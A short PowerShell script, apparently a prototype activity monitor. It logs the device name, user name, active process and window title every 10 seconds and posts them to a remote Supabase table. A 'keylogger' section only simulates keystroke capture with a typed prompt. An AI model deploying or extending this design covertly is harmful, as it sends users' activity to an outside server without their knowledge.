. "$PSScriptRoot/config.ps1"

function Send-Log {
    param ($table, $payload)

    $headers = @{ "apikey" = $env:SUPABASE_API_KEY; "Content-Type" = "application/json" }
    $json = $payload | ConvertTo-Json -Depth 5
    Invoke-RestMethod -Uri "$($env:SUPABASE_URL)/rest/v1/$table" -Method POST -Headers $headers -Body $json
}

$deviceId = "$env:COMPUTERNAME-$env:USERNAME"

while ($true) {
    # Activity log
    $window = (Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Sort-Object StartTime -Descending | Select-Object -First 1)
    if ($window) {
        $log = @{
            device_id = $deviceId
            process_name = $window.ProcessName
            window_title = $window.MainWindowTitle
            timestamp = (Get-Date).ToString("o")
        }
        Send-Log -table "activity_logs" -payload $log
    }

    # Key logger (basic, simplified input detection)
    $input = Read-Host "Type something (simulation of keylogging)"
    if ($input) {
        $keylog = @{
            device_id = $deviceId
            app_name = $window?.ProcessName
            keystroke = $input
            timestamp = (Get-Date).ToString("o")
        }
        Send-Log -table "key_logs" -payload $keylog
    }

    Start-Sleep -Seconds 10
}
